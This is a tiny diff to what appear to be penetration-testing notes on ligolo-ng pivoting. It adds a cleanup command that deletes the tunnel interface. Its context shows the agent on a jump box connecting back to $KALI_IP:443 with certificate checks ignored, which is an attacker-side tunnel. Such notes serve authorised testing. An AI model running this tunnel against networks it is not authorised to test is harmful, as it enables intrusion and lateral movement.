@@ -23,3 +23,8 @@ on jump box:
 ```bash
 ./ligolo-agent -connect $KALI_IP:443 -ignore-cert
 ```
+
+remove:
+```bash
+sudo ip link delete ligolo
+```
